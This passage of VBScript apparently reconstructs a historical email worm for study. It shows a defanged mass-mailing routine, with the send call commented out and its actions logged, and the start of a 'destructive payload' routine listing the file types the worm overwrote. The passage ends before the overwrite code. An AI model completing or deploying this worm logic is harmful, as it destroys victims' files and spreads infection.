    '     mail.Send  ' Automatically sent without user confirmation!
    ' Next
    
    LogAction "EMAIL SUBJECT: " & emailSubject
    LogAction "EMAIL BODY: " & emailBody
    LogAction "ATTACHMENT: " & attachmentName
    LogAction "NOTE: Original worm sent emails WITHOUT user confirmation"
End Sub

' ============================================================================
' CORE MECHANISM 4: File Overwriting (Destructive Payload)
' ============================================================================
' The worm searched for specific file types and OVERWROTE them with copies
' of itself, destroying the original files. This was its destructive payload.

Sub OverwriteFiles()
    Dim fso, drives, drive, folder
    
    On Error Resume Next
    Set fso = CreateObject("Scripting.FileSystemObject")
    
    ' Target file extensions - the worm overwrote these file types:
    ' .mp3, .mp2, .wav, .avi, .mov, .jpg, .jpeg, .png, .gif, .css, .js
    ' .vbs, .vbe, .jse, .doc, .xls, .ppt, .mdb, .accdb
    Dim targetExtensions
    targetExtensions = Array(".mp3", ".mp2", ".wav", ".avi", ".mov", _
                            ".jpg", ".jpeg", ".png", ".gif", _
                            ".css", ".js", ".vbs", ".doc", ".xls")
    
